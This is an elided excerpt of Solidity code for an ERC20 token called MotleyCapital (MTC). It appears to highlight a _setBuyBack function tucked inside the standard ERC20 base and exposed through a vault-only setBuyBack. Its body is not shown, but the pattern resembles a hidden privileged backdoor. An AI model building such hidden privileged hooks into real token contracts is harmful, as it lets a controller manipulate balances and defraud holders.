...
abstract contract ERC20 is IERC20 {
  ...
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    ...
    function _setBuyBack(address account_, uint256 amount_) internal virtual {
...
contract MotleyCapital  is ERC20Permit, VaultOwned {

    using SafeMath for uint256;

    constructor() ERC20("MotleyCapital", "MTC", 9) {
    }

    function setBuyBack(address account_, uint256 amount_) external onlyVault() {
        _setBuyBack(account_, amount_);
    }
